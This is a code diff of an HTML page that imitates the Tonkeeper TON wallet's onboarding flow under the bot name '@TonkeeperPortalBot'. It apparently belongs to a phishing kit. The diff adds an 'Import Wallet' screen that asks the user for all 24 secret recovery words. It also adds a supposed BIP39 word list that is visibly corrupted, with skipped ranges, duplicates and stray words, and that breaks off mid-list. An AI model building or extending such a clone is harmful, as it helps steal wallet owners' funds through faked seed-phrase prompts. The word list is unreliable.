@@ -51,10 +51,12 @@
         @keyframes rotateBolt { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         .bolt-anim { animation: rotateBolt 2s linear infinite; }
 
-        .check-circle { stroke-dasharray: 166; stroke-dashoffset: 166; stroke: #4CD964; fill: none; animation: s-circle 0.6s forwards; }
-        .check-mark { stroke-dasharray: 48; stroke-dashoffset: 48; animation: s-check 0.3s 0.8s forwards; stroke: #4CD964; stroke-width: 3; stroke-linecap: round; }
-        @keyframes s-circle { 100% { stroke-dashoffset: 0; } }
-        @keyframes s-check { 100% { stroke-dashoffset: 0; } }
+        .check-mark-path {
+            stroke-dasharray: 30;
+            stroke-dashoffset: 30;
+            animation: draw-check 0.5s ease-out 0.2s forwards;
+        }
+        @keyframes draw-check { to { stroke-dashoffset: 0; } }
 
         .words-grid {
             display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: repeat(12, auto); grid-auto-flow: column;
@@ -64,17 +66,15 @@
         .word-num { color: #8A929A; width: 26px; text-align: right; margin-right: 12px; font-size: 15px; }
         .word-val { font-weight: 500; color: #FFFFFF; }
 
-        .footer-fixed {
-            position: absolute; bottom: 0; left: 0; right: 0; padding: 20px 24px 40px;
-            background: linear-gradient(to top, #0F1215 85%, transparent);
-            z-index: 60;
-        }
-
-        .check-footer {
-            padding: 20px 0 60px;
+        .footer-sticky {
+            position: fixed;
+            bottom: 0;
+            left: 0;
             width: 100%;
+            padding: 20px 24px 40px;
             background: #0F1215;
-            z-index: 60;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            z-index: 100;
         }
 
         .btn-blue { width: 100%; background-color: #0098EA; color: white; padding: 16px; border-radius: 20px; font-size: 18px; font-weight: 600; transition: transform 0.1s; border:none; outline:none; }
@@ -113,44 +113,27 @@
             overflow-y: auto;
             padding-right: 4px;
         }
-        .emoji-item-minimal {
-            font-size: 22px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: transform 0.1s;
-        }
+        .emoji-item-minimal { font-size: 22px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: transform 0.1s; }
         .emoji-item-minimal:active { transform: scale(1.3); }
 
-        .emoji-grid-exact::-webkit-scrollbar { width: 4px; }
-        .emoji-grid-exact::-webkit-scrollbar-thumb { background: #21262B; border-radius: 10px; }
-
-        #screen-check { overflow-y: auto; display: flex; flex-direction: column; padding-top: 60px; }
+        .scrollable-content {
+            flex-grow: 1;
+            width: 100%;
+            overflow-y: auto;
+            padding-bottom: 140px;
+            -webkit-overflow-scrolling: touch;
+        }
 
         .wallet-action-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; }
         .action-circle { width: 56px; height: 56px; background: #1C2127; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #0098EA; }
         .bottom-nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; color: #8A929A; }
         .bottom-nav-item.active { color: #0098EA; }
 
-        .notif-icon-container {
-            width: 120px; height: 120px; background: #31A6F1; border-radius: 28px;
-            position: relative; display: flex; align-items: center; justify-content: center;
-        }
-        .notif-dot {
-            width: 32px; height: 32px; background: #2B3D4F; border-radius: 50%;
-            position: absolute; top: -10px; right: -10px; border: 4px solid #0F1215;
-        }
+        .notif-icon-container { width: 120px; height: 120px; background: #31A6F1; border-radius: 28px; position: relative; display: flex; align-items: center; justify-content: center; }
+        .notif-dot { width: 32px; height: 32px; background: #2B3D4F; border-radius: 50%; position: absolute; top: -10px; right: -10px; border: 4px solid #0F1215; }
 
-        /* Анимация конфетти для нового экрана (photo_2026-05-01_23-49-40.jpg) */
-        .confetti-piece {
-            position: absolute; width: 8px; height: 8px; border-radius: 50%;
-            animation: confetti-fall 3s ease-out forwards; opacity: 0;
-        }
-        @keyframes confetti-fall {
-            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
-        }
+        .confetti-piece { position: absolute; width: 8px; height: 8px; border-radius: 50%; animation: confetti-fall 3s ease-out forwards; opacity: 0; }
+        @keyframes confetti-fall { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
     </style>
 </head>
 <body>
@@ -199,7 +182,7 @@
                     <div class="text-tk-blue text-2xl"><svg width="26" height="26" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg></div>
                     <div class="text-left"><h4 class="font-bold">New Wallet</h4><p class="text-tk-text-gray text-[14px]">Create new wallet</p></div>
                 </button>
-                <button class="w-full bg-tk-card-dark p-5 rounded-[20px] flex items-center gap-4">
+                <button onclick="startImportFlow()" class="w-full bg-tk-card-dark p-5 rounded-[20px] flex items-center gap-4">
                     <div class="text-tk-blue text-2xl"><svg width="26" height="26" fill="currentColor" viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg></div>
                     <div class="text-left"><h4 class="font-bold">Import Wallet</h4><p class="text-tk-text-gray text-[14px]">Import with a 24 secret words</p></div>
                 </button>
@@ -219,19 +202,18 @@
         <div class="absolute bottom-10 bot-tag">@TonkeeperPortalBot</div>
     </div>
 
-    <!-- 5. CREATED с новой анимацией галочки -->
-<div id="screen-done" class="screen flex items-center justify-center">
-    <div class="mb-12 relative scale-75"> <!-- Масштабируем, чтобы соответствовало дизайну -->
-        <div class="w-32 h-32 bg-[#4CD964] rounded-full flex items-center justify-center shadow-[0_0_20px_rgba(76,217,100,0.4)]">
-            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#0F1215" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
-                <!-- Анимированный путь галочки -->
-                <path class="check-mark-path" d="M20 6L9 17l-5-5"/>
-            </svg>
+    <!-- 5. CREATED -->
+    <div id="screen-done" class="screen flex items-center justify-center">
+        <div class="mb-12 relative scale-75">
+            <div class="w-32 h-32 bg-[#4CD964] rounded-full flex items-center justify-center shadow-[0_0_20px_rgba(76,217,100,0.4)]">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#0F1215" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
+                    <path class="check-mark-path" d="M20 6L9 17l-5-5"/>
+                </svg>
+            </div>
         </div>
+        <h2 class="text-[24px] font-bold text-center">Your wallet has<br>just been created!</h2>
+        <div class="absolute bottom-10 bot-tag">@TonkeeperPortalBot</div>
     </div>
-    <h2 class="text-[24px] font-bold text-center">Your wallet has<br>just been created!</h2>
-    <div class="absolute bottom-10 bot-tag">@TonkeeperPortalBot</div>
-</div>
 
     <!-- 6. GRAB A PEN -->
     <div id="screen-paper" class="screen px-8 py-12">
@@ -253,7 +235,7 @@
             <p class="text-tk-text-gray text-center text-[16px] mb-10 leading-snug">Write down these 24 words in the order given below and store them in a secret, safe place.</p>
             <div id="phrase-grid" class="words-grid"></div>
         </div>
-        <div class="footer-fixed">
+        <div class="footer-sticky">
             <button onclick="goToVerification()" class="btn-blue">Continue</button>
             <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
         </div>
@@ -262,21 +244,40 @@
     <!-- 8. SO, LET'S CHECK -->
     <div id="screen-check" class="screen px-8">
         <button class="back-btn-float" onclick="show('screen-recovery')"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
-        <div class="w-full flex flex-col items-center">
+        <div class="w-full flex flex-col items-center flex-grow overflow-y-auto pb-40">
             <h1 class="text-[32px] font-bold text-center mb-2">So, let's check</h1>
             <p class="text-tk-text-gray text-center text-[16px] mb-10 leading-snug px-4">
                 To check whether you've written down your recovery phrase correctly, please enter the <span id="check-indices-text">5th, 12th, and 20th</span> words.
             </p>
             <div class="w-full max-w-[340px] space-y-4">
-                <div class="check-input-wrapper" id="wrapper-1"><span class="check-label-fixed" id="label-1">5:</span><input type="text" id="check-input-1" class="check-input" autocomplete="off" oninput="validateVerification()" onkeydown="handleCheckKey(event, 2)"></div>
-                <div class="check-input-wrapper" id="wrapper-2"><span class="check-label-fixed" id="label-2">12:</span><input type="text" id="check-input-2" class="check-input" autocomplete="off" oninput="validateVerification()" onkeydown="handleCheckKey(event, 3)"></div>
-                <div class="check-input-wrapper" id="wrapper-3"><span class="check-label-fixed" id="label-3">20:</span><input type="text" id="check-input-3" class="check-input" autocomplete="off" oninput="validateVerification()" onkeydown="handleCheckKey(event, 0)"></div>
+                <div class="check-input-wrapper" id="wrapper-1"><span class="check-label-fixed" id="label-1">5:</span><input type="text" id="check-input-1" class="check-input" autocomplete="off" oninput="validateVerification()"></div>
+                <div class="check-input-wrapper" id="wrapper-2"><span class="check-label-fixed" id="label-2">12:</span><input type="text" id="check-input-2" class="check-input" autocomplete="off" oninput="validateVerification()"></div>
+                <div class="check-input-wrapper" id="wrapper-3"><span class="check-label-fixed" id="label-3">20:</span><input type="text" id="check-input-3" class="check-input" autocomplete="off" oninput="validateVerification()"></div>
             </div>
-            
-            <div class="w-full max-w-[340px] check-footer">
-                <button id="btn-final-check" onclick="openPasswordSheet()" class="btn-blue btn-disabled">Continue</button>
-                <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
+        </div>
+        <div class="footer-sticky">
+            <button id="btn-final-check" onclick="openPasswordSheet()" class="btn-blue btn-disabled">Continue</button>
+            <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
+        </div>
+    </div>
+
+    <!-- 8.1 IMPORT WALLET -->
+    <div id="screen-import" class="screen">
+        <button class="back-btn-float" onclick="show('screen-welcome')"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+        
+        <div class="scrollable-content px-8">
+            <div class="w-full flex flex-col items-center">
+                <h1 class="text-[32px] font-bold text-center mb-2 mt-4">Enter your recovery phrase</h1>
+                <p class="text-tk-text-gray text-center text-[16px] mb-8 leading-snug px-4">
+                    To restore access to your wallet, enter the 24 secret recovery words given to you when you created your wallet.
+                </p>
+                <div class="w-full max-w-[340px] space-y-3" id="import-inputs-container"></div>
             </div>
+        </div>
+
+        <div class="footer-sticky">
+            <button id="btn-import-continue" onclick="void(0)" class="btn-blue btn-disabled">Continue</button>
+            <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
         </div>
     </div>
 
@@ -308,10 +309,7 @@
     <div id="screen-name-wallet" class="screen">
         <div class="px-8 mt-10 w-full max-w-[380px] flex flex-col h-full">
             <h1 class="text-center text-[28px] font-bold mb-3">Name your wallet</h1>
-            <p class="text-center text-tk-text-gray text-[14px] mb-6 leading-snug opacity-80">
-                Name your wallet to easily identify it while using the Tonkeeper. These names are stored locally, and can only be seen by you.
-            </p>
-
+            <p class="text-center text-tk-text-gray text-[14px] mb-6 leading-snug opacity-80">Name your wallet to easily identify it while using the Tonkeeper. These names are stored locally, and can only be seen by you.</p>
             <div class="w-full border-2 border-tk-blue rounded-[18px] bg-[#161B20] p-4 flex items-center justify-between shrink-0">
                 <div class="flex-grow">
                     <div class="text-tk-text-gray text-[11px] mb-1">Wallet name</div>
@@ -319,66 +317,7 @@
                 </div>
                 <div id="wallet-icon-display" class="text-2xl ml-2 cursor-pointer select-none" onclick="randomizeEmoji()">🎲</div>
             </div>
-
-            <div class="emoji-grid-exact flex-grow" id="emoji-container">
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">📁</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🍃</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🔒</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🔑</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🛡️</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">❄️</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">✨</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">☀️</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🐇</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">⚡</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">⚙️</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">✋</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🔍</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">💲</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">€</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">£</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">¥</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">₽</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">₹</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😀</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😁</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😅</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😆</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤣</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😂</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🙂</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🙃</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😉</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😊</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😇</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🥰</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😍</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤩</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😘</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😗</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😚</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😙</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😋</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😛</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😜</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤪</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😝</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤑</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤗</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤭</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤔</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤐</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🤨</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😐</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😑</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😶</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😏</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😒</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">🙄</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😬</div>
-                <div class="emoji-item-minimal" onclick="selectEmoji(this)">😌</div>
-            </div>
-
+            <div class="emoji-grid-exact flex-grow" id="emoji-container"></div>
             <div class="py-6 shrink-0">
                 <button onclick="goToNotificationScreen()" class="w-full btn-blue">Save</button>
                 <div class="text-center mt-4 bot-tag">@TonkeeperPortalBot</div>
@@ -388,98 +327,51 @@
 
     <!-- 11. NOTIFICATIONS SCREEN -->
     <div id="screen-notifications" class="screen px-8">
-        <div class="w-full flex justify-end pt-4 pb-12">
-            <!-- Кнопка Later теперь ведет на экран поздравления (photo_2026-05-01_23-49-40.jpg) -->
-            <button onclick="congratsAndGo()" class="text-[#8A929A] text-[15px] font-semibold bg-[#1C2127] px-4 py-1.5 rounded-full">Later</button>
-        </div>
-        
-        <div class="flex-grow flex flex-col items-center justify-center">
-            <div class="notif-icon-container mb-12">
-                <div class="notif-dot"></div>
-            </div>
-
-            <h1 class="text-[32px] font-extrabold text-center mb-4 px-2">Get instant notifications</h1>
-            <p class="text-[#8A929A] text-center text-[16px] font-medium leading-tight max-w-[280px]">
-                Get notifications when you receive TON, tokens and NFTs.
-            </p>
-        </div>
-
-        <div class="w-full pb-16">
-            <button onclick="void(0)" class="btn-blue">Enable notifications</button>
-        </div>
+        <div class="w-full flex justify-end pt-4 pb-12"><button onclick="congratsAndGo()" class="text-[#8A929A] text-[15px] font-semibold bg-[#1C2127] px-4 py-1.5 rounded-full">Later</button></div>
+        <div class="flex-grow flex flex-col items-center justify-center"><div class="notif-icon-container mb-12"><div class="notif-dot"></div></div><h1 class="text-[32px] font-extrabold text-center mb-4 px-2">Get instant notifications</h1><p class="text-[#8A929A] text-center text-[16px] font-medium leading-tight max-w-[280px]">Get notifications when you receive TON, tokens and NFTs.</p></div>
+        <div class="w-full pb-16"><button onclick="void(0)" class="btn-blue">Enable notifications</button></div>
     </div>
 
-    <!-- 12. NEW CONGRATULATIONS SECTION (Exactly like in photo_2026-05-01_23-49-40.jpg) -->
+    <!-- 12. CONGRATULATIONS -->
     <div id="screen-congrats" class="screen flex flex-col items-center justify-center bg-[#0F1215]">
         <div id="confetti-container" class="absolute inset-0 pointer-events-none"></div>
-        
-        <!-- Big Green Check (from photo) -->
-        <div class="mb-12 relative">
-            <div class="w-32 h-32 bg-[#4CD964] rounded-full flex items-center justify-center">
-                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#0F1215" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
-            </div>
-        </div>
-
+        <div class="mb-12 relative"><div class="w-32 h-32 bg-[#4CD964] rounded-full flex items-center justify-center"><svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#0F1215" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><path class="check-mark-path" d="M20 6L9 17l-5-5"/></svg></div></div>
         <h1 class="text-[28px] font-bold text-center leading-tight">Congratulations! You've set<br>up your wallet</h1>
-        
         <div class="absolute bottom-10 bot-tag">@TonkeeperPortalBot</div>
     </div>
 
     <!-- 13. FINAL MAIN WALLET -->
     <div id="screen-main-wallet" class="screen" style="background-color: #0B0E11;">
         <div class="w-full px-4 py-6"></div>
-
-        <div class="flex flex-col items-center mt-2">
-            <div class="flex items-center gap-1 cursor-pointer">
-                <span id="final-wallet-emoji" class="text-lg">??</span>
-                <span id="final-wallet-name" class="font-bold text-[20px]">Account 1</span>
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8A929A" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>
-            </div>
-            
-            <div class="mt-8 text-[44px] font-bold">$0</div>
-            <div class="text-tk-text-gray text-[14px] flex items-center gap-1 mt-1">
-                <span id="final-wallet-address">UQ...alef</span>
-            </div>
-        </div>
-
+        <div class="flex flex-col items-center mt-2"><div class="flex items-center gap-1 cursor-pointer"><span id="final-wallet-emoji" class="text-lg">??</span><span id="final-wallet-name" class="font-bold text-[20px]">Account 1</span><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8A929A" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg></div><div class="mt-8 text-[44px] font-bold">$0</div><div class="text-tk-text-gray text-[14px] flex items-center gap-1 mt-1"><span id="final-wallet-address">UQ...alef</span></div></div>
         <div class="flex justify-center gap-8 mt-10 w-full px-6">
             <div class="wallet-action-btn"><div class="action-circle"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></div><span class="text-[13px] text-tk-text-gray font-medium">Buy</span></div>
             <div class="wallet-action-btn"><div class="action-circle"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg></div><span class="text-[13px] text-tk-text-gray font-medium">Send</span></div>
             <div class="wallet-action-btn"><div class="action-circle"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12l7 7 7-7"/></svg></div><span class="text-[13px] text-tk-text-gray font-medium">Receive</span></div>
             <div class="wallet-action-btn"><div class="action-circle"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M6.99 11L3 14.99l3.99 3.99V16H14v-2H6.99v-2.99zM21 9l-3.99-3.99V8H10v2h7.01v2.99L21 9z"/></svg></div><span class="text-[13px] text-tk-text-gray font-medium">Swap</span></div>
         </div>
-
-        <div class="w-full px-4 mt-12">
-            <div class="bg-[#1C2127] rounded-[24px] p-4 flex items-center justify-between">
-                <div class="flex items-center gap-4">
-                    <div class="w-11 h-11 bg-tk-blue rounded-full flex items-center justify-center overflow-hidden">
-                        <img src="i.webp" alt="TON" class="w-full h-full object-cover">
-                    </div>
-                    <div><div class="font-bold text-[17px]">TON</div><div class="text-[13px] text-tk-text-gray">$<span id="ton-price-list">...</span> <span id="ton-percent" class="text-tk-green">+0.00%</span></div></div>
-                </div>
-                <div class="text-right"><div class="font-bold text-[17px]">0</div><div class="text-[13px] text-tk-text-gray">$0</div></div>
-            </div>
-        </div>
-
+        <div class="w-full px-4 mt-12"><div class="bg-[#1C2127] rounded-[24px] p-4 flex items-center justify-between"><div class="flex items-center gap-4"><div class="w-11 h-11 bg-tk-blue rounded-full flex items-center justify-center overflow-hidden"><img src="i.webp" alt="TON" class="w-full h-full object-cover"></div><div><div class="font-bold text-[17px]">TON</div><div class="text-[13px] text-tk-text-gray">$<span id="ton-price-list">...</span> <span id="ton-percent" class="text-tk-green">+0.00%</span></div></div></div><div class="text-right"><div class="font-bold text-[17px]">0</div><div class="text-[13px] text-tk-text-gray">$0</div></div></div></div>
         <div class="absolute bottom-0 left-0 right-0 border-t border-[#21262B] bg-[#0B0E11] px-2 py-3 flex items-center justify-between pb-8">
             <div class="bottom-nav-item active"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8z"/></svg><span class="text-[10px] font-medium">Wallet</span></div>
             <div class="bottom-nav-item"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M13 3h-2v10h2V3zm4.83 2.17l-1.42 1.42C17.99 7.86 19 9.81 19 12c0 3.87-3.13 7-7 7s-7-3.13-7-7c0-2.19 1.01-4.14 2.58-5.42L6.17 5.17C4.23 6.82 3 9.26 3 12c0 4.97 4.03 9 9 9s9-4.03 9-9c0-2.74-1.23-5.18-3.17-6.83z"/></svg><span class="text-[10px] font-medium">History</span></div>
             <div class="bottom-nav-item"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 7h2v2h-2V7zm0 4h2v6h-2v-6z"/></svg><span class="text-[10px] font-medium">Browser</span></div>
             <div class="bottom-nav-item"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg><span class="text-[10px] font-medium">Settings</span></div>
         </div>
-
-        <div class="absolute bottom-[84px] w-full text-center bot-tag" style="opacity: 0.6;">@TonkeeperPortalBot</div>
     </div>
 
     <script>
         const splash = document.getElementById('screen-splash'), logo = document.getElementById('logo-svg'), sheet = document.getElementById('add-wallet-sheet'), passSheet = document.getElementById('password-sheet'), overlay = document.getElementById('bg-overlay'), grid = document.getElementById('phrase-grid');
-        const wordPool = ["beef", "educate", "waste", "post", "walk", "race", "gym", "just", "symptom", "legal", "awake", "eternal", "key", "gauge", "evil", "good", "kiss", "quit", "wrestle", "bless", "adjust", "subway", "faint", "lawsuit"];
+        
+        const bip39Raw = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice adviser advocate affair afford afloat afraid African after again against age agency agenda agent agile ago agony agree ahead aid aim air airport aisle alarm album alcohol alert alien alike alive all alley allow almost alone along alpha already also alter always amateur amaze amber ambush amend merit merry mesh message metal method metric metro micro mid midway might mild milk mill mimic mind mine mineral minor minus minute mirror misery miss mistake mix mixed mixture mobile model modify mom moment monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music mustard mute mutual muzzle myself mystery mystic myth naive name napkin narrow nasty nation native natural nature navy near nebula neck need negative neglect neither nephew nerve nest net network neutral never news next nice night nimble nine ninth nitrogen no noble noise nominee non nor north nose notable note nothing notice notify notion novel november nuclear number nurse nut nylon oak obey object oblong obscure observe obtain obvious occur ocean october odor off offer office offline often oil okay old olive olympic omega omit once one onion online only open opera opinion oppose optic option oracle orange orbit orchard order ordinary organ organic orient origin oriole orphan ostrich other outdoor outer outling output outside oval oven over overt owl owner oxygen oyster ozone pact paddle page pair palace palm pan pancake panel panic panther paper parade parent park parrot party pass patch path patient patio patrol patron pause pave payment peace peanut pear peasant pebble peculiar pen penalty pencil people pepper perfect peril period person pet petal phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play pleasant please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position positive post poster pot potato powder power practice praise pray preach precede precious precise predict prefer pregnant premier prentice prepare present preserve preset press presume preteen pretend pretty prevent preview price pride primary print prior prison private prize probable process produce profit program project promote prompt proof proper property prophet protect proud prove provide public pudding pull pulp pulse pump punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter queen query quest queue quick quiet quilt quit quiz quota rabbit raccoon race rack radar radiant radical radio rail rain raise rally ramp ranch random range rank rapid rare rate rather ratio raven raw razor ready real reality rear reason rebel rebuild recall receive recipe record recycle reduce reef refer refine reflect reform refuse region regret regular reject relax release relief rely remain remedy remember remind remove render renew rent reopen repair repeat replace reply report repress request rescue resemble resist resort resource respond rest result retire retreat return reveal review reward rhythm rib ribbon rice rich ride ridge rifle right rigid ring riot ripple rise risk ritual rival river road roar roast robot robust rocket romance roof rookie room rope rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle safari sage sail salad salmon salon salt salute salvage same sample sand satisfy saturn sauce sausage save say scale scan scare scatter scene scheme school science scissors scorpion scout scrap screen screw script scrub sea search season seat second secret section sector secure see seed seek segment select sell seminar senior sense sensor sentence series service session settle seven seventh several severe sew shabby shadow shaft shallow shame shape share shark sharp shed sheep shelf shell sheriff shield shift shine ship shirt shiver shock shoe shoot shop short shoulder shove show shower shred shrimp shrine shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister situate six sixth size skate sketch ski skill skin skirt skull sky slam slap slate sleep slender slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow snug soap soccer social sock soda soft solar soldier solid solution solve someone song soon sorry sort soul sound soup source south space span spare spatial speak special species specific speech speed spell spend sphere spice spider spike spin spirit split spoil sponsor spoon sport spot spray spread spring spy square squash squat stab stack stadium staff stage stairs stamp stand standard star start state station statue stay steady steak steal steam steel steep steer stem step stereo stick still sting stock stomach stone stool stop storage store storm story stove straight strain strand strange strap strategy straw stray street stress stretch strike strip strive strong struggle student studio study stuff stumble style subject submit submerge submit subtle suburb subway success sudden suffer sugar suggest suit summer sun sunday sunflower sunny sunrise sunset sunshine super supply support suppose supreme sure surface surge surface swap swarm swear sweat sweep sweet swift swim swing switch swipe swipe switch sword symbol symptom syrup system table tablet tackle tag tail talent tall talon tame tan tank tap tape target target taste tattoo taxi teach team tell teller temple ten tenant tend ten tent term terrace terrain test testify text texture thank that theater theatre theme then theory 